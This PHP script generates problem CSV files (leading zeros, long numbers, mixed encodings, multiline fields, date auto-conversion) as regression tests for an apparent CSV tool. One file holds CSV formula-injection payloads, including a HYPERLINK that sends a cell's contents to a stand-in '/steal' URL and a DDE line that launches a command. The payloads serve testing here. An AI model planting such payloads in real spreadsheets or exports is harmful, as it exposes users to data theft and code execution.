<?php

/*
 * Generates examples/problem-files/: classic CSV files that break when they are
 * simply double-clicked in Excel. Each one is a regression test (see
 * tests/ProblemFilesTest.php) and is used in the demo video.
 *
 *   php scripts/generate-problem-files.php [--big]
 *
 * --big also writes a 200,000-row file (not committed) for performance demos.
 */

declare(strict_types=1);

$dir = dirname(__DIR__).'/examples/problem-files';
if (!is_dir($dir)) {
    mkdir($dir, 0777, true);
}

/** @param list<list<string>> $rows */
function csv(array $rows, string $delimiter = ','): string
{
    $stream = fopen('php://memory', 'w+');
    foreach ($rows as $row) {
        fputcsv($stream, $row, $delimiter, '"', '', "\r\n");
    }
    rewind($stream);

    return (string) stream_get_contents($stream);
}

$files = [];

// 1. Leading zeros: Excel turns "02134" into 2134.
$files['01-leading-zeros.csv'] = csv([
    ['Employee ID', 'Name', 'ZIP', 'Branch Code', 'Salary'],
    ['000742', 'Emma Johnson', '02134', '007', '72000'],
    ['001358', 'Noah Williams', '07030', '012', '68500'],
    ['000019', 'Olivia Brown', '01002', '003', '91250'],
    ['002201', 'Liam Davis', '08540', '045', '55000'],
]);

// 2. Long numbers: Excel shows 4.11111E+15 and rounds the last digits to 0.
$files['02-long-numbers.csv'] = csv([
    ['Order Number', 'Card Number', 'IMEI', 'Tracking', 'Amount'],
    ['202611050000123456', '4111111111111111', '490154203237518', '1Z999AA10123456784', '1499.99'],
    ['202611050000123457', '5500005555555559', '356938035643809', '1Z999AA10123456785', '89.50'],
    ['202611050000123458', '340000000000009', '353918058436271', '1Z999AA10123456786', '12000'],
]);

// 3. Phone numbers: "+44 ..." loses its plus or becomes a formula, 12+ digits go scientific.
$files['03-phone-numbers.csv'] = csv([
    ['Name', 'Country', 'Mobile', 'WhatsApp', 'Calls'],
    ['Aarav Sharma', 'India', '+91 98765 43210', '919876543210', '14'],
    ['Oliver Smith', 'UK', '+44 7700 900123', '447700900123', '3'],
    ['Sofia Rossi', 'Italy', '+39 312 345 6789', '393123456789', '27'],
    ['Lucas Martin', 'France', '0612345678', '33612345678', '8'],
]);

// 4. European Excel export: Windows-1252 + semicolons. Opens as mojibake in one column.
$files['04-european-excel-export.csv'] = mb_convert_encoding(csv([
    ['Kunde', 'Stadt', 'Umsatz €', 'Rabatt', 'Notiz'],
    ['Müller GmbH', 'München', '1.234,56', '5,5%', 'Größte Bestellung'],
    ['Société Générale', 'Besançon', '987,00', '0%', 'Crème brûlée'],
    ['Peña & Hijos', 'Logroño', '12.500,00', '12%', 'Año récord'],
    ['Þór Jónsson', 'Reykjavík', '45,90', '0%', 'Æ Ø Å œ ß'],
], ';'), 'Windows-1252', 'UTF-8');

// 5. Chinese GBK export (Windows / WPS default in China): shows ??? or 乱码.
$files['05-chinese-gbk.csv'] = mb_convert_encoding(csv([
    ['订单号', '客户', '手机号', '城市', '金额'],
    ['00001', '张伟', '13800138000', '北京', '1288.00'],
    ['00002', '李娜', '13912345678', '上海', '560.50'],
    ['00003', '王芳', '13698765432', '深圳', '99.90'],
    ['00004', '刘洋', '15011112222', '广州', '2399.00'],
]), 'GB18030', 'UTF-8');

// 6. Excel "Unicode Text": UTF-16 LE with BOM, tab separated. Most tools choke on it.
$files['06-excel-unicode-text.txt'] = "\xFF\xFE".mb_convert_encoding(csv([
    ['Language', 'Greeting', 'City', 'Rating'],
    ['Japanese', 'こんにちは', '東京', '4.8'],
    ['Arabic', 'مرحبا', 'دبي', '4.6'],
    ['Greek', 'Γειά σου', 'Αθήνα', '4.7'],
    ['Hindi', 'नमस्ते', 'मुंबई', '4.9'],
    ['Emoji', '👋 Hello', '🌍 Earth', '5'],
], "\t"), 'UTF-16LE', 'UTF-8');

// 7. Quotes, commas and line breaks inside fields: rows get split or shifted.
$files['07-multiline-and-quotes.csv'] = csv([
    ['SKU', 'Product', 'Description', 'Shipping Address', 'Price'],
    ['MON-24', '24" Monitor', 'Full HD, 75Hz, "eye care" mode', "221B Baker Street\nLondon NW1 6XE\nUnited Kingdom", '149.00'],
    ['KB-01', 'Keyboard, wireless', "Line one\nLine two, with comma", "1600 Amphitheatre Pkwy\nMountain View, CA 94043", '39.90'],
    ['CBL-3', 'USB-C cable (2 m)', '', 'Plain address, single line', '9.99'],
]);

// 8. Formula injection: Excel executes these when the CSV is opened.
$files['08-formula-injection.csv'] = csv([
    ['User', 'Comment', 'Score'],
    ['alice', '=HYPERLINK("http://example.com/steal?d="&A1,"Click me")', '10'],
    ['bob', "=cmd|' /C calc'!A0", '7'],
    ['carol', '+SUM(1+1)', '8'],
    ['dave', '-2+3', '9'],
    ['eve', '@SUM(1,2)', '6'],
]);

// 9. Values Excel silently turns into dates (famous with gene names) or numbers.
$files['09-auto-date-conversion.csv'] = csv([
    ['Gene', 'Part Number', 'Size', 'Version', 'Ratio', 'Count'],
    ['MARCH1', '1-2', '3/4', '1.10', '1E5', '25'],
    ['SEPT2', '11-12', '10/12', '2.0', '2E10', '31'],
    ['DEC1', '3-15', '1/2', '10.01', '6E3', '7'],
]);

foreach ($files as $name => $bytes) {
    file_put_contents("{$dir}/{$name}", $bytes);
    printf("%-32s %6d bytes\n", $name, strlen($bytes));
}

if (in_array('--big', $argv, true)) {
    $f = fopen("{$dir}/10-big-200k-rows.csv", 'w');
    fwrite($f, "Order ID,Customer,Email,Phone,Amount,City,Date\r\n");
    for ($i = 1; $i <= 200000; ++$i) {
        fwrite($f, sprintf("%08d,Customer %d,user%d@example.com,+91 98%08d,%.2f,City %d,2026-%02d-%02d\r\n", $i, $i, $i, $i, $i * 1.37, $i % 300, 1 + $i % 12, 1 + $i % 28));
    }
    fclose($f);
    echo "10-big-200k-rows.csv (not committed)\n";
}
